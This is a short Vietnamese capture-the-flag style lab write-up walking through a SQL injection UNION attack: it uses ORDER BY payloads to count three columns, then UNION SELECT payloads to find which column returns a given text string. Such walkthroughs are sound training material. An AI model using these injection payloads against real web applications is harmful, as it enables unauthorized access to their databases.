# SQL injection UNION attack, finding a column containing text

Bài lab sẽ cung cấp một giá trị ngẫu nhiên mà bạn cần để xuất hiện trong kết quả truy vấn. Để giải quyết vấn đề của bài lab này, hãy thực hiện một cuộc tấn công SQL injection UNION để trả về một hàng bổ sung chứa giá trị được cung cấp.

Ta kiểm tra xem trong bảng của database có bao nhiêu cột bằng cách dùng lần lượt các payload sau:
- `filter?category=' ORDER BY 1--`
- `filter?category=' ORDER BY 2--`
- `filter?category=' ORDER BY 3--`

![](https://cdn.discordapp.com/attachments/1124588087931043891/1134106299240554506/image.png)

- `filter?category=' ORDER BY 4--`( Tới đây thì sever error, vậy là chỉ có 3 cột trong bảng của database)

![](https://cdn.discordapp.com/attachments/1124588087931043891/1134106642024239195/image.png)

`Make the database retrieve the string: 'uETlNV'` Ta lần lượt kiểm tra từng cột xem cột đó có chứa dữ liệu `'uETlNV'` hay không bằng cách lần lượt dùng tới `UNION SELECT`:

- `' UNION SELECT 'uETlNV' ,NULL,NULL--`

![](https://cdn.discordapp.com/attachments/1124588087931043891/1134108602299322459/image.png)

Vậy là ở cột 1 không có thứ mà ta cần tìm, tiếp theo ta tìm ở cột 2 xem sao
- `' UNION SELECT NULL, 'uETlNV' ,NULL--`

![](https://cdn.discordapp.com/attachments/1124588087931043891/1134109200742625313/image.png)

Vậy là dữ liệu ta cần tìm nằm ở cột 2 của bảng trong database.




